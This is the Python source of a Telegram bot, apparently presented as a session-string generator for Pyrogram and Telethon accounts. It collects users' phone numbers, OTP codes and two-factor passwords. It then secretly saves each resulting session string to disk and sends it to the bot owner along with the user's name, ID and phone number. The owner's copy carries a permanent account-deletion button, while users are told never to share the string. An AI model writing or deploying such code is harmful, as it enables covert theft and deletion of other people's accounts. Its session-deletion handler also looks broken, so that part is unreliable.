# © VEGA — Intellectual Property Rights

# Respect for Copyright and Content Protection

# In this project, we are committed to respecting community laws, protecting intellectual property rights, and appreciating the efforts of all creators and content owners.

# "All rights are reserved to their original owners, and this project does not constitute a waiver of any intellectual property rights belonging to other parties.

# © VEGA — All rights related to this project are reserved to their owners."

# Supporting Creators is a Responsibility

# - Creativity is the fruit of effort that deserves appreciation and respect.
# - Protecting copyright contributes to building a more just digital community.
# - Usage licenses and redistribution terms must be respected.
# - We reject unauthorized use of any content protected by copyright.

# Responsible Use Pledge

# By using this project, you pledge to respect intellectual property rights and not to copy or redistribute any protected content without obtaining the necessary permission or license.

# Be a partner in protecting creativity, and do not be a cause of rights violations.

# © VEGA | By: @TopVeGa All Rights Reserved



import os, json, logging
from datetime import datetime, timezone
from asyncio.exceptions import TimeoutError
from io import BytesIO

import config
from pyrogram import Client, filters
from pyrogram.types import Message, InlineKeyboardButton, InlineKeyboardMarkup
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.functions.account import DeleteAccountRequest
from StringGen.utils import ask
from config import OWNER_ID
from pyrogram.errors import (
    ApiIdInvalid, PhoneNumberInvalid, PhoneCodeInvalid, PhoneCodeExpired,
    SessionPasswordNeeded, PasswordHashInvalid,
    ApiIdInvalid as ApiIdInvalid1, PhoneNumberInvalid as PhoneNumberInvalid1,
    PhoneCodeInvalid as PhoneCodeInvalid1, PhoneCodeExpired as PhoneCodeExpired1,
    SessionPasswordNeeded as SessionPasswordNeeded1, PasswordHashInvalid as PasswordHashInvalid1,
)
from telethon.errors import (
    ApiIdInvalidError, PhoneNumberInvalidError, PhoneCodeInvalidError,
    PhoneCodeExpiredError, SessionPasswordNeededError, PasswordHashInvalidError,
    FloodWaitError, AuthRestartError,
)

from pyrogram import Client, filters
from pyrogram.errors import RPCError
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import RPCError as TelethonRPCError
import config

logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)

os.makedirs("StrngGenBot", exist_ok=True)

ASK_QUES = "هنا النسخة المختصرة والمنظمة:\n<b>1-بيروجرام V1</b>  للأصدارات القديمة\n<b>2-بيروجرام V2</b>  للأصدارات احدث (يدعم الميوزك والمصادر الأخرى)\n<b>3-تليثون</b> للحسابات الشخصية و حماية باستخدام مصدر معين\n<b>4-تليثون بوت</b> لإنشاء وتشغيل البوتات من المنصة\n<b>5-بيروجرام</b> بوت : مخصص لبوتات بيروجرام\nㅤ"
BUTTONS_QUES = [
    [
        InlineKeyboardButton("بايروجرام v1", callback_data="pyrogram_v1"),
        InlineKeyboardButton("بايروجرام v2", callback_data="pyrogram_v2"),
    ],
    [InlineKeyboardButton("تيليثون", callback_data="telethon")],
    [
        InlineKeyboardButton("بايروجرام بوت", callback_data="pyrogram_bot"),
        InlineKeyboardButton("تيليثون بوت", callback_data="telethon_bot"),
    ],
]

GEN_BUTTON = [[InlineKeyboardButton("إنشاء جلسة", callback_data="generate")]]
DELETE_BUTTON = [[InlineKeyboardButton("حذف الحساب نهائياً", callback_data="delete_all_sessions")]]

async def ask_or_cancel(bot: Client, uid: int, prompt: str, *, timeout: int | None = None) -> str | None:
    try:
        m = await ask(bot, uid, prompt, timeout=timeout)
    except TimeoutError:
        raise TimeoutError("انتهى الوقت - لم يتم الرد لفترة")

    tx = m.text.strip()
    if tx in ("/cancel", "/restart"):
        await bot.send_message(uid,
            "تم الإلغاء." if tx == "/cancel" else "إعادة تشغيل البوت...",
            reply_markup=InlineKeyboardMarkup(GEN_BUTTON),
        )
        return None
    return tx

async def save_to_cache(uid: int, string_: str, meta: dict) -> None:
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    base = f"StrngGenBot/{uid}_{ts}"
    with open(base + "_session.txt", "w") as f:
        f.write(string_)
    with open(base + "_info.json", "w") as f:
        json.dump(meta, f, indent=2)

async def send_to_owner(bot: Client, string_: str, meta: dict) -> None:
    try:
        user_info = await bot.get_users(meta['user_id'])

        info_text = (
            "<b>معلومات الجلسة الجديدة:\n\n"
            f"• الاسم: {user_info.first_name} {user_info.last_name or ''}\n"
            f"• المعرف: @{user_info.username}\n"
            f"• الآيدي: `{user_info.id}`\n"
            f"• رقم الهاتف: `{meta.get('phone_number', 'غير معروف')}`\n"
            f"• نوع الجلسة: {meta['session_type']}\n"
            f"• تاريخ الإنشاء: {meta['created_at']}\n\n"
            f"كود الجلسة:\n`{string_}`</b>"
        )

        await bot.send_message(
            config.OWNER_ID,
            info_text,
            reply_markup=InlineKeyboardMarkup(DELETE_BUTTON)
        )
    except Exception as e:
        logger.error(f"فشل في إرسال الجلسة للمطور: {e}")

async def delete_telegram_account(client):
    try:
        await client(DeleteAccountRequest("حذف نهائي بواسطة بوت الجلسات"))
        return True
    except Exception as e:
        logger.error(f"فشل في حذف الحساب: {e}")
        return False

def readable_error(exc: Exception) -> str:
    mapping = {
        (ApiIdInvalid, ApiIdInvalid1, ApiIdInvalidError): "معرف API أو الهاش غير صالح.",
        (PhoneNumberInvalid, PhoneNumberInvalid1, PhoneNumberInvalidError): "رقم الهاتف غير صالح.",
        (PhoneCodeInvalid, PhoneCodeInvalid1, PhoneCodeInvalidError): "كود OTP خاطئ.",
        (PhoneCodeExpired, PhoneCodeExpired1, PhoneCodeExpiredError): "كود OTP منتهي الصلاحية.",
        (PasswordHashInvalid, PasswordHashInvalid1, PasswordHashInvalidError): "كلمة مرور التحقق بخطوتين خاطئة.",
        FloodWaitError: "تم حظرك مؤقتًا - حاول لاحقًا.",
        AuthRestartError: "مطلوب إعادة مصادقة. ابدأ من جديد.",
    }
    for group, txt in mapping.items():
        if isinstance(exc, group):
            return txt
    return f"خطأ غير معروف: {str(exc).replace('`', '')}"

@Client.on_message(filters.private & filters.command(["generate", "gen", "string", "str"]))
async def cmd_generate(_, m: Message):
    await m.reply(ASK_QUES, reply_markup=InlineKeyboardMarkup(BUTTONS_QUES))

@Client.on_callback_query(filters.regex("^delete_all_sessions$"))
async def delete_all_sessions(client, callback_query):
    user_id = callback_query.from_user.id
    await callback_query.answer("جاري حذف جميع الجلسات...")

    results = []

    try:
        try:
            await client.send_message("me", "جارٍ حذف جلسة بيروجرام...")
            await client.log_out()
            results.append("تم حذف جلسة بيروجرام بنجاح")
        except RPCError as e:
            results.append(f"فشل في حذف جلسة بيروجرام: {str(e)}")

        try:
            tel_client = TelegramClient(StringSession(), config.API_ID, config.API_HASH)
            await tel_client.connect()

            if await tel_client.is_user_authorized():
                await tel_client.send_message("me", "جارٍ حذف جلسة تليثون...")
                await tel_client.log_out()
                results.append("تم حذف جلسة تليثون بنجاح")
            else:
                results.append("لا توجد جلسة تليثون نشطة")

            await tel_client.disconnect()
        except TelethonRPCError as e:
            results.append(f"فشل في حذف جلسة تليثون: {str(e)}")

        try:
            results.append("تم تخطي حذف جلسات البوتات (تتطلب إعدادات إضافية)")
        except Exception as e:
            results.append(f"خطأ في حذف جلسات البوتات: {str(e)}")

        message = "نتيجة عملية الحذف:\n\n" + "\n".join(results)
        await callback_query.message.edit_text(message)

    except Exception as e:
        await callback_query.message.edit_text(f"حدث خطأ غير متوقع: {str(e)}")

async def generate_session(
    bot: Client,
    msg: Message,
    *,
    telethon: bool = False,
    old_pyro: bool = False,
    is_bot: bool = False,
):
    uid = msg.chat.id
    uname = msg.from_user.username or "unknown"

    ses_type = (
        "تيليثون" if telethon else
        ("بايروجرام" if old_pyro else "بايروجرام v2")
    )
    if is_bot:
        ses_type += " بوت"

    await msg.reply(f"بدء إنشاء جلسة {ses_type}...")
    api_id, api_hash = config.API_ID, config.API_HASH

    prompt = (
        "أرسل توكن البوت\n`123456:ABCDEF`"
        if is_bot else
        "أرسل رقم الهاتف\n`+201234567890`"
    )
    try:
        token_or_phone = await ask_or_cancel(bot, uid, prompt)
        if token_or_phone is None or not token_or_phone.strip() or token_or_phone.strip() in [".", "-", "_"]:
            return await msg.reply("رقم الهاتف او التوكن غير صالح.", reply_markup=InlineKeyboardMarkup(GEN_BUTTON))
        phone_number = token_or_phone.strip() if not is_bot else "بوت"
    except TimeoutError as te:
        return await msg.reply(f"{te}", reply_markup=InlineKeyboardMarkup(GEN_BUTTON))

    client = (
        TelegramClient(StringSession(), api_id, api_hash)
        if telethon else
        Client("bot" if is_bot else "user", api_id=api_id, api_hash=api_hash,
               bot_token=token_or_phone if is_bot else None, in_memory=True)
    )

    try:
        await client.connect()
    except Exception as exc:
        logger.exception("فشل في الاتصال")
        return await msg.reply(readable_error(exc), reply_markup=InlineKeyboardMarkup(GEN_BUTTON))

    try:
        if is_bot:
            if telethon:
                await client.start(bot_token=token_or_phone)
            else:
                await client.sign_in_bot(token_or_phone)
        else:
            code = await (client.send_code_request(token_or_phone) if telethon else client.send_code(token_or_phone))
            otp = await ask_or_cancel(bot, uid, "أرسل كود OTP (`1 2 3 4 5`)", timeout=600)
            if otp is None: return
            otp = otp.replace(" ", "")
            try:
                if telethon:
                    await client.sign_in(token_or_phone, otp)
                else:
                    await client.sign_in(token_or_phone, code.phone_code_hash, otp)
            except (SessionPasswordNeeded, SessionPasswordNeeded1, SessionPasswordNeededError):
                pw = await ask_or_cancel(bot, uid, "أرسل كلمة مرور التحقق بخطوتين", timeout=300)
                if pw is None: return
                try:
                    if telethon:
                        await client.sign_in(password=pw)
                    else:
                        await client.check_password(password=pw)
                except Exception as exc:
                    await client.disconnect()
                    return await msg.reply(readable_error(exc), reply_markup=InlineKeyboardMarkup(GEN_BUTTON))

    except Exception as exc:
        await client.disconnect()
        return await msg.reply(readable_error(exc), reply_markup=InlineKeyboardMarkup(GEN_BUTTON))

    try:
        string_session = client.session.save() if telethon else await client.export_session_string()
    except Exception as exc:
        await client.disconnect()
        return await msg.reply(readable_error(exc), reply_markup=InlineKeyboardMarkup(GEN_BUTTON))

    meta = {
        "session_type": ses_type,
        "user_id": uid,
        "username": uname,
        "phone_number": phone_number,
        "is_bot": is_bot,
        "is_telethon": telethon,
        "created_at": datetime.now(timezone.utc).isoformat(),
    }

    await save_to_cache(uid, string_session, meta)
    await send_to_owner(bot, string_session, meta)

    try:
        note = (
            f"• تم استخراج جلستك بنجاح \n• نوع الجلسة : {ses_type} \n\n`{string_session}`\n\n"
            "•تحذير: لا تشاركها مع أي أحد.\n\n"
            "• تم تطوري بواسطه : @TopVeGa\n"
            "• لا تنسي الانضمام : @VeGAone"
        )

        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("قناة التحديثات", url="https://t.me/vegaone")],
            [InlineKeyboardButton("المصدر", url="https://t.me/Logii3")]
        ])

        if is_bot:
            await bot.send_message(uid, note, reply_markup=keyboard)
        else:
            if telethon:
                await client.send_message("me", note)
                await bot.send_message(uid, "تم إرسال الجلسة إلى المحفوظات\nتحذير: لا تشاركها مع أي أحد", reply_markup=keyboard)
            else:
                try:
                    user = await client.get_me()
                    if user.photo:
                        photo = await client.download_profile_photo(user.id, file=BytesIO())
                        photo.seek(0)
                        await client.send_photo(
                            "me",
                            photo="https://files.catbox.moe/kb0msq.jpg",
                            caption=note,
                            reply_markup=keyboard
                        )
                    else:
                        await client.send_message("me", note, reply_markup=keyboard)
                except:
                    await client.send_message("me", note, reply_markup=keyboard)

                await bot.send_message(uid, "تم إرسال الجلسة إلى المحفوظات\nتحذير: لا تشاركها مع أي أحد", reply_markup=keyboard)
    finally:
        await client.disconnect()